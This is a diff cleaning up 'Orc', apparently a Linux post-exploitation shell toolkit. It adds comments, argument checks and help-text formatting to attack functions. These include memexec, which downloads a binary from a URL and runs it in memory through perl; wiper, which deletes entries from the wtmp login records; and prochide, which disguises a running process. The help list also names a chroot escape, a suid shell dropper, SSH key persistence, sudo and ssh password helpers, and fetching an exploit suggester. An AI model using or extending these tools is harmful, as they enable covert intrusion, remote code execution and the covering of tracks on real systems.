@@ -6,7 +6,7 @@ OVERSION="0.6"
 
 # ~~~ Compatibility Layer ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 #
-# In the compatiblity layer the functions to handle the differences
+# In the compatibility layer the functions to handle the differences
 # between different Unix flavors, shell types are collected.
 # Functions outside the compatibility layer call functions in this
 # layer or call tools/programs common for all Unix flavors.
@@ -85,7 +85,7 @@ orc_tryTcpConnection () {
   # Try to open a TCP connection to given host and port.
   # Argument: host name or host IP address
   #           TCP port number
-  # Return: 0 if and ony if TCP connection could be opened
+  # Return: 0 if and only if TCP connection could be opened
   if [ $# -ne 2 ]; then
     echo 'Error: need host and TCP port as arguments' >&2
     return 1
@@ -135,7 +135,7 @@ sys.exit(0)
 
 orc_listtmp() {
   # List tmpfs directories with access information.
-  # Search in the list of tmpfs filesystems and in a list of common
+  # Search in the list of tmpfs filesystem and in a list of common
   # file destinations.
   # Use simple df call to keep script compatible to the most systems.
   # -l, -t, --output is not available on some systems, e.g. busybox.
@@ -527,7 +527,7 @@ if hash lsblk 2>/dev/null; then
 	fi
 elif hash dmesg 2>/dev/null; then
 	if dmesg -T | grep -i Boot_image | grep -qi "rd.luks.uuid"; then
-	echo "Encrypted partition detected. No lsblk found. Investigate manuallt."
+	echo "Encrypted partition detected. No lsblk found. Investigate manual."
 	fi
 fi
 }
@@ -560,9 +560,17 @@ getidle() {
   # reminder: do not use gawk functions, e.g. systime
 }
 
+
 srm() {
-shred -vzfun 2 "$1"
+  # secure shredding of files
+  # Argument: file(s) to overwrite and to remove.
+  if [ $# -lt 1 ]; then
+    echo 'Error: srm needs a file name(s) as argument' >&2
+    return 1
+  fi
+  shred -vzfun 2 "$@"
 }
+
 
 qssh() {
   # ssh without a tty - qssh [password] [normal arguments]
@@ -599,11 +607,17 @@ qsu() {
 }
 
 memexec() {
-memfile=$(orc_loadURL "$1" | od --endian=big -An -x | tr -d ' ' | tr -d '\n')
-finalmem=$(echo "$memfda" | base64 -d)
-finalmem=${finalmem}$(echo "$memfile/ or die;")
-finalmem=${finalmem}$(echo "$memfdb" | base64 -d)
-echo "$finalmem" | perl
+  # Execute a binary in-memmory from webserver.
+  # Argument: URL of the binary, http or https is supported.
+  if [ $# -ne 1 ]; then
+    echo 'Error: memexec needs URL as argument' >&2
+    return 1
+  fi
+  memfile=$(orc_loadURL "$1" | od --endian=big -An -x | tr -d ' ' | tr -d '\n')
+  finalmem=$(echo "$memfda" | base64 -d)
+  finalmem=${finalmem}$(echo "$memfile/ or die;")
+  finalmem=${finalmem}$(echo "$memfdb" | base64 -d)
+  echo "$finalmem" | perl
 }
 
 getpty() {
@@ -636,7 +650,14 @@ echo "$sshkey" >> "$NHOME/.ssh/authorized_keys"
 }
 
 psgrep() {
-ps -weFH | grep "$1" | grep -v grep
+  # process grep
+  # Argument: search pattern.
+  if [ $# -ne 1 ]; then
+    echo 'Error: psgrep needs grep pattern as argument'
+    return 1
+  fi
+  # don't list this process running the grep
+  ps -weFH | grep "$1" | grep -v grep
 }
 
 getescape() {
@@ -690,7 +711,13 @@ portscan() {
 }
 
 fpssh() {
-ssh-keyscan "$1"
+  # pull ssh remote host public fingerprints
+  # Argument: host name, arguments passed thru to ssh-keyscan
+  if [ $# -lt 1 ]; then
+    echo 'Error: fpssh needs host name as argument' >&2
+    return 1
+  fi
+  ssh-keyscan "$@"
 }
 
 getip() {
@@ -711,8 +738,8 @@ printf "DNS says: "
 
 prochide() {
   # Execute a program hiden by a long program name.
-  # arguments: program to execute with optional arguments.
-  # methode  : use the longest command line of the current running
+  # Arguments: program to execute with optional arguments.
+  # Method   : use the longest command line of the current running
   #            processes as name of the program to start.
   LONGARG=$(ps --no-header -wweo cmd | awk 'length(X)<length {X=$0}; END {print X}')
   bash -c "exec -a \"$LONGARG\" $*"
@@ -732,10 +759,18 @@ awk -F ' ' '{print $1}' "$NHOME/.ssh/known_hosts" > "$HOME/kh"
 )
 
 wiper() {
-utmpdump /var/log/wtmp | grep -v "$1" > "$HOME/.l"
-touch -r /var/log/wtmp "$HOME/.l"
-utmpdump -r -o /var/log/wtmp "$HOME/.l"
-touch -r "$HOME/.l" /var/log/wtmp
+  # Removes entries from wtmp
+  # Needs write access to the wtmp file. Typical only root
+  # has write access to the login/logout record file.
+  # Argument: grep pattern to remove
+  if [ $# -ne 1 ]; then
+    echo 'Error: wiper needs grep pattern as argument' >&2
+    return 1
+  fi
+  utmpdump /var/log/wtmp | grep -v "$1" > "$HOME/.l"
+  touch -r /var/log/wtmp "$HOME/.l"
+  utmpdump -r -o /var/log/wtmp "$HOME/.l"
+  touch -r "$HOME/.l" /var/log/wtmp
 }
 
 getrel() {
@@ -748,10 +783,10 @@ getrel() {
 
 hangup() {
   # Terminate someones PTS by killing their SSH process.
-  # arguments: Number(s) of PTS. A single number or a list if numbers
-  #            splitted in the arguments is possible.
-  #            Or "all" to terminate all PTS connected via SSH.
-  #            Or "all other" to terminate all but not our SSH.
+  # arguments: Number(s) of PTS. A single number or a list
+  #            of numbers in the arguments is possible.
+  #            Or keyword "all" to terminate all PTS connected via SSH.
+  #            Or keyword "all other" to terminate all but not our SSH.
   if [ $# -lt 1 ]; then
     echo 'Error: hangup functions needs argument: ID number of PTS' >&2
     return 1
@@ -872,16 +907,19 @@ A probably non-comprehensive list of functionality in Orc v$OVERSION.
 [*] getpty - pop a pty with script
 [*] getidle - list all ptys and their idle times accurately.
 [*] getnet - attempt to enumerate hosts on the local network with ping
-[*] getsuspect - pull my suspect tool from github.
-[*] getspec - grab some hardware information.
+[*] getsuspect - pull my suspect tool from github
+[*] getspec - grab some hardware information
 [*] getuservices - list all running services with non-user accounts in passwd
-[*] getescape - attempt to escape chroot via bad privs on the /proc/ filesystem.
-[*] getdbus - list all dbus services.
+[*] getescape - attempt to escape chroot via bad privs
+                on the /proc/ filesystem
+[*] getdbus - list all dbus services
 [*] getexploit - download and run linux-exploit-suggester
-[*] memexec - execute a binary in-memory from a webserver - memexec [full URI] (x64 only)
+[*] memexec - execute a binary in-memory from a webserver
+            - memexec [full URI] (x64 only)
 [*] portscan - run a portscan against common ports - portscan [host]
-[*] prochide - run a program with $0 changed to the longest entry in ps - prochide [program + args]
-[*] srm - alias for secure shredding of files.
+[*] prochide - run a program with $0 changed to the longest entry in ps
+             - prochide [program + args]
+[*] srm - alias for secure shredding of files
 [*] qsu - sudo without a tty - qsu [password] [normal arguments]
 [*] qssh - ssh without a tty - qssh [password] [normal arguments]
 [*] wiper - remove entries from wtmp - wiper [string to grep out]
@@ -889,7 +927,9 @@ A probably non-comprehensive list of functionality in Orc v$OVERSION.
 [*] stomp - alias for touch -r (needs arguments)
 [*] tools - check for common tools
 [*] dropsuid - drop tiny suid shell - dropsuid > [file]
-[*] hangup - terminate someones PTS by killing their SSH process. Very loud, DO NOT USE. - hangup [PTS NUMBER]
+[*] hangup  - terminate someones PTS by killing their SSH process.
+              Very loud, DO NOT USE.
+            - hangup [PTS NUMBER]
 "
 }
 
